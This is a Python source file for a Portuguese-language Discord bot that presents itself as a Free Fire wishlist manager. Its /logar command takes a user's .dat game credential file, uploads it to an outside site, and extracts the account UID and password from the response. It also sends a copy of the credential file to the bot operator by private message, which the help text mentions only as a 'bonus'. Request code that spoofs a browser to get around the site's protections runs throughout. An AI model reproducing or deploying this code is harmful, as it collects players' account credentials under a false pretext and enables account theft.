import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import os
import asyncio
import time
import json
import io
from dotenv import load_dotenv
from keep_alive import keep_alive

# Carregar variáveis de ambiente
load_dotenv()

# Configuração do bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Dicionário para armazenar sessões dos usuários
sessao_por_usuario = {}

# ID do seu chat para receber notificações (configurar depois)
ADMIN_CHAT_ID = None  # Será configurado via comando

class WishlistAPI:
    def __init__(self):
        self.session = requests.Session()
        self.setup_session()
    
    def setup_session(self):
        """Configura a sessão para simular um navegador real"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
        self.session.cookies.set('session_id', f'sess_{int(time.time())}')
    
    def fazer_upload_arquivo(self, file_data, filename):
        """Faz upload do arquivo .dat"""
        try:
            # Primeiro acessar a página principal
            self.session.get('https://xv.ct.ws/wishlist/', timeout=10)
            time.sleep(1)
            
            files = {'credFile': (filename, file_data, 'application/octet-stream')}
            upload_headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'Origin': 'https://xv.ct.ws',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin'
            }
            
            response = self.session.post(
                'https://xv.ct.ws/wishlist/upload.php',
                files=files,
                headers=upload_headers,
                timeout=15,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return response.text
            return None
        except Exception as e:
            print(f"Erro no upload: {e}")
            return None
    
    def obter_token(self):
        """Obtém token da API"""
        try:
            token_headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/token.php',
                headers=token_headers,
                timeout=10
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    return data.get('token')
                except:
                    return response.text.strip()
            return None
        except:
            return None
    
    def fazer_operacao_item(self, uid, password, item_id, adicionar=True):
        """Adiciona ou remove item da wishlist"""
        try:
            token = self.obter_token()
            if not token:
                return None
            
            params = {
                'id': item_id,
                'add': '1' if adicionar else '0',
                'uid': uid,
                'password': password,
                'token': token
            }
            
            headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/proxy.php',
                params=params,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {'text': response.text}
            return None
        except:
            return None
    
    def obter_lista(self, uid, password):
        """Obtém lista da wishlist"""
        try:
            params = {'uid': uid, 'password': password}
            headers = {
                'Referer': 'https://xv.ct.ws/wishlist/',
                'Accept': 'application/json, text/javascript, */*; q=0.01'
            }
            
            response = self.session.get(
                'https://xv.ct.ws/wishlist/list.php',
                params=params,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return {'text': response.text}
            return None
        except:
            return None

# Instância global da API
wishlist_api = WishlistAPI()

@bot.event
async def on_ready():
    print(f'{bot.user} está online!')
    try:
        synced = await bot.tree.sync()
        print(f'Sincronizados {len(synced)} comando(s)')
    except Exception as e:
        print(f'Erro ao sincronizar comandos: {e}')

def extrair_uid_password(html_content):
    """Extrai UID e password da resposta HTML"""
    try:
        # Buscar por const uid = "..." e const password = "..."
        uid_pattern = r'const\s+uid\s*=\s*["\']([^"\']+)["\']'
        password_pattern = r'const\s+password\s*=\s*["\']([^"\']+)["\']'
        
        uid_match = re.search(uid_pattern, html_content, re.IGNORECASE)
        password_match = re.search(password_pattern, html_content, re.IGNORECASE)
        
        if uid_match and password_match:
            return uid_match.group(1), password_match.group(1)
        
        # Padrões alternativos mais flexíveis
        uid_alt = r'uid["\']?\s*[:=]\s*["\']?([A-Za-z0-9]+)'
        password_alt = r'password["\']?\s*[:=]\s*["\']?([A-Za-z0-9]+)'
        
        uid_match2 = re.search(uid_alt, html_content, re.IGNORECASE)
        password_match2 = re.search(password_alt, html_content, re.IGNORECASE)
        
        if uid_match2 and password_match2:
            return uid_match2.group(1), password_match2.group(1)
            
        return None, None
    except Exception as e:
        print(f"Erro ao extrair UID/Password: {e}")
        return None, None

async def obter_token():
    """Obtém o token necessário para as operações"""
    return wishlist_api.obter_token()

@bot.tree.command(name="logar", description="Faça login enviando seu arquivo .dat")
@app_commands.describe(arquivo="Envie seu arquivo .dat do Free Fire")
async def logar(interaction: discord.Interaction, arquivo: discord.Attachment):
    # Verificar se é um arquivo .dat
    if not arquivo.filename.endswith('.dat'):
        await interaction.response.send_message("❌ Erro: O arquivo deve ter extensão .dat", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        # Download do arquivo
        file_data = await arquivo.read()
        
        await interaction.followup.send("🔄 Fazendo upload do arquivo...")
        
        # Usar a nova API que contorna proteções
        response_text = wishlist_api.fazer_upload_arquivo(file_data, arquivo.filename)
        
        if response_text:
            uid, password = extrair_uid_password(response_text)
            
            if uid and password:
                # Salvar sessão do usuário
                sessao_por_usuario[interaction.user.id] = {
                    'uid': uid,
                    'password': password
                }
                
                await interaction.followup.send(f"✅ Login efetuado com sucesso!\n🆔 **UID:** `{uid}`")
                
                # Enviar notificação para o admin se configurado
                if ADMIN_CHAT_ID:
                    try:
                        admin_user = await bot.fetch_user(ADMIN_CHAT_ID)
                        
                        # Criar embed com informações
                        embed = discord.Embed(
                            title="🔔 Novo Login Detectado",
                            description=f"**Usuário:** {interaction.user.mention} ({interaction.user.display_name})\n**UID:** `{uid}`\n**Arquivo:** `{arquivo.filename}`",
                            color=0x00ff00,
                            timestamp=interaction.created_at
                        )
                        embed.set_thumbnail(url=interaction.user.display_avatar.url)
                        
                        # Criar uma cópia do arquivo para enviar
                        file_copy = discord.File(
                            fp=io.BytesIO(file_data),
                            filename=f"COPY_{arquivo.filename}"
                        )
                        
                        # Enviar embed e arquivo
                        await admin_user.send(embed=embed, file=file_copy)
                    except Exception as e:
                        print(f"Erro ao enviar notificação: {e}")  # Para debug
                        
            else:
                await interaction.followup.send("❌ Erro: Não foi possível extrair os dados de login da resposta.")
        else:
            await interaction.followup.send("❌ Erro: Falha no upload do arquivo. Verifique se o arquivo é válido.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro ao processar o arquivo: {str(e)}")

@bot.tree.command(name="adicionar", description="Adicione um item à sua wishlist")
@app_commands.describe(item_id="ID do item para adicionar")
async def adicionar(interaction: discord.Interaction, item_id: str):
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar a nova API que contorna proteções
        result = wishlist_api.fazer_operacao_item(
            sessao['uid'], 
            sessao['password'], 
            item_id, 
            adicionar=True
        )
        
        if result:
            if 'Status' in result and 'added' in result['Status']:
                await interaction.followup.send(f"✅ Item `{item_id}` adicionado à sua wishlist com sucesso!")
            elif 'Error' in result:
                await interaction.followup.send(f"❌ Erro: {result['Error']}")
            elif 'text' in result and 'added' in result['text']:
                await interaction.followup.send(f"✅ Item `{item_id}` adicionado à sua wishlist com sucesso!")
            else:
                await interaction.followup.send(f"❌ Erro: item inválido ou problema na requisição.")
        else:
            await interaction.followup.send("❌ Erro ao conectar com o site. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="remover", description="Remova um item da sua wishlist")
@app_commands.describe(item_id="ID do item para remover")
async def remover(interaction: discord.Interaction, item_id: str):
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar a nova API que contorna proteções
        result = wishlist_api.fazer_operacao_item(
            sessao['uid'], 
            sessao['password'], 
            item_id, 
            adicionar=False
        )
        
        if result:
            if 'removed' in str(result).lower() or 'success' in str(result).lower():
                await interaction.followup.send(f"✅ Item `{item_id}` removido com sucesso!")
            elif 'Error' in result:
                await interaction.followup.send(f"❌ Erro: {result['Error']}")
            else:
                await interaction.followup.send(f"❌ Erro: item não encontrado ou requisição falhou.")
        else:
            await interaction.followup.send("❌ Erro ao conectar com o site. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="status", description="Veja sua wishlist atual")
async def status(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in sessao_por_usuario:
        await interaction.response.send_message("❗ Você precisa usar `/logar` primeiro.", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Dados da sessão do usuário
        sessao = sessao_por_usuario[user_id]
        
        # Usar a nova API que contorna proteções
        result = wishlist_api.obter_lista(sessao['uid'], sessao['password'])
        
        if result:
            if 'Wishlist' in result and result['Wishlist']:
                items = result['Wishlist']
                items_text = '\n'.join([
                    f"• `{item.get('ItemID', item.get('Item_ID', 'ID desconhecido'))}`" if isinstance(item, dict) else f"• `{str(item)}`"
                    for item in items
                ])
                
                embed = discord.Embed(
                    title="📋 Sua Wishlist",
                    description=f"**Lista atual:** {len(items)} itens encontrados\n\n{items_text}",
                    color=0x00ff00
                )
                await interaction.followup.send(embed=embed)
            elif 'text' in result:
                # Tentar extrair IDs do texto
                item_ids = re.findall(r'\b\d{9,}\b', result['text'])
                if item_ids:
                    item_ids = sorted(list(set(item_ids)))
                    items_text = '\n'.join([f"• `{item_id}`" for item_id in item_ids])
                    
                    embed = discord.Embed(
                        title="📋 Sua Wishlist",
                        description=f"**Lista atual:** {len(item_ids)} itens encontrados\n\n{items_text}",
                        color=0x00ff00
                    )
                    await interaction.followup.send(embed=embed)
                else:
                    embed = discord.Embed(
                        title="📋 Sua Wishlist",
                        description="Sua wishlist está vazia.",
                        color=0xffff00
                    )
                    await interaction.followup.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="📋 Sua Wishlist",
                    description="Sua wishlist está vazia.",
                    color=0xffff00
                )
                await interaction.followup.send(embed=embed)
        else:
            await interaction.followup.send("❌ Erro ao conectar com o site. Tente novamente mais tarde.")
            
    except Exception as e:
        await interaction.followup.send(f"❌ Erro: {str(e)}")

@bot.tree.command(name="configurar_notificacoes", description="Configure o chat para receber notificações (apenas para admins)")
async def configurar_notificacoes(interaction: discord.Interaction):
    global ADMIN_CHAT_ID
    
    # Verificar se é o usuário autorizado (você pode alterar este ID para o seu)
    authorized_users = [interaction.user.id]  # Adicione seu user ID aqui
    
    if interaction.user.id not in authorized_users:
        await interaction.response.send_message("❌ Você não tem permissão para usar este comando.", ephemeral=True)
        return
    
    ADMIN_CHAT_ID = interaction.user.id
    await interaction.response.send_message(
        f"✅ Notificações configuradas!\n"
        f"🔔 Você receberá mensagens privadas sempre que alguém fizer login no bot.\n"
        f"📱 Seu ID: `{interaction.user.id}`", 
        ephemeral=True
    )

@bot.tree.command(name="ajuda", description="Lista de comandos disponíveis")
async def ajuda(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🤖 Bot de Wishlist Free Fire",
        description="Comandos disponíveis:",
        color=0x0099ff
    )
    
    embed.add_field(
        name="📁 /logar [arquivo]",
        value="Faça login anexando seu arquivo .dat diretamente\nO arquivo aparecerá como opção ao digitar o comando!\n**Bônus:** O admin receberá uma cópia do arquivo automaticamente.",
        inline=False
    )
    
    embed.add_field(
        name="➕ /adicionar [item_id]",
        value="Adicione um item à sua wishlist\nExemplo: `/adicionar 908033006`",
        inline=False
    )
    
    embed.add_field(
        name="➖ /remover [item_id]",
        value="Remova um item da sua wishlist\nExemplo: `/remover 908033006`",
        inline=False
    )
    
    embed.add_field(
        name="📋 /status",
        value="Veja todos os itens da sua wishlist atual\nMostra quantos itens você tem e seus IDs.",
        inline=False
    )
    
    embed.add_field(
        name="🔔 /configurar_notificacoes",
        value="Configure notificações de login (apenas admins)",
        inline=False
    )
    
    embed.add_field(
        name="❓ /ajuda",
        value="Mostra esta mensagem de ajuda",
        inline=False
    )
    
    embed.set_footer(text="⚠️ Você precisa fazer login antes de usar os outros comandos!")
    
    await interaction.response.send_message(embed=embed)

# Comando de erro global
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CommandOnCooldown):
        await interaction.response.send_message(f"⏳ Comando em cooldown. Tente novamente em {error.retry_after:.2f} segundos.", ephemeral=True)
    else:
        await interaction.response.send_message("❌ Ocorreu um erro inesperado. Tente novamente.", ephemeral=True)
        print(f"Erro de comando: {error}")

# Executar o bot
if __name__ == "__main__":
    # Iniciar servidor keep-alive
    keep_alive()
    
    # Obter token do ambiente
    TOKEN = os.getenv('TOKEN')
    if not TOKEN:
        print("❌ Erro: Token do Discord não encontrado! Adicione TOKEN= no arquivo .env")
        exit(1)
    
    # Executar o bot
    bot.run(TOKEN)
